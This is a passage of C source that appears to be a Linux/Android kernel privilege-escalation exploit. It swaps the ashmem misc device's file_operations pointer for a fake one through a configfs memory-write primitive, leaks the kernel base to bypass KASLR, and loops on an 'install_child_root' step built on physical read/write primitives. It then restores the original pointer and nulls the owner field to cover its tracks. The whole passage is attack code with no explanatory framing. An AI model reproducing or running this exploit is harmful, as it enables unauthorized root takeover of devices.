    pr_error("KS_W1_TEST restore failed restore=%zd read=%zd after=%016llx "
             "owner=%zd errno=%d\n", restore, ra,
             (unsigned long long)after, owner, errno);
    return 0;
  }

  uint64_t before = 0;
  ssize_t rb = configfs_read_once(fd, misc_fops, &before, sizeof(before));
  fops_before = before;
  if (rb != (ssize_t)sizeof(before) || before != fake_fops) {
    cfi_last_step = 4;
    cfi_last_errno = errno;
    goto fail;
  }

  if (!leak_kernel_base(fd)) {
    cfi_last_step = 9;
    cfi_last_errno = errno;
    goto fail;
  }

  /* boot_id restore is cosmetic; non-fatal (slide may not have run, or
   * the sysctl address may be wrong in the no-slide path). */
#if SLIDE_BOOTID_DATA_PRESENT
  restore_slide_boot_id(fd);
#endif

  int installed = 0;
  pipe_stage_attempts = 0;
  for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
    pipe_stage_attempts++;
    if (attempt != 0) {
      reset_pipe_attempt();
    }
    if (install_child_root(fd)) {
      installed = 1;
      break;
    }
    if (pipe_cache_gate_ok && physrw_read_ok && physrw_write_ok &&
        physrw_read64_ok && physrw_write64_ok) {
      break;
    }
  }

  if (!installed) {
    cfi_last_step = 8;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
  ssize_t restore = configfs_write_once(
      fd, misc_fops, &original_fops, sizeof(original_fops));
  cfi_restore_ret = restore;
  if (restore != (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 5;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t after = 0;
  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
  fops_after = after;
  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
    cfi_last_step = 6;
    cfi_last_errno = errno;
    goto fail;
  }

  uint64_t null_owner = 0;
  ssize_t owner =
    configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
  cfi_owner_ret = owner;
  SYSCHK(close(fd));
  if (owner == (ssize_t)sizeof(null_owner) &&
      restore == (ssize_t)sizeof(original_fops)) {
    cfi_last_step = 0;
    cfi_last_errno = 0;
    atomic_store(&cfi_stage_done, 1);
    return 1;
  }
  cfi_last_step = 7;
  cfi_last_errno = errno;
  return 0;

fail:
  if (dirty) {
    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
    if (kaslr_done) {
      original_fops_fail = canon_addr(ASHMEM_FOPS);
    }
    cfi_restore_ret = configfs_write_once(
        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
    if (can_read_back &&
        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
      uint64_t after_fail = 0;
      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
          (ssize_t)sizeof(after_fail)) {
        fops_after = after_fail;
      }
    }
    uint64_t null_owner_fail = 0;
    cfi_owner_ret = configfs_write_once(
        fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
  }
  SYSCHK(close(fd));
  return 0;
}
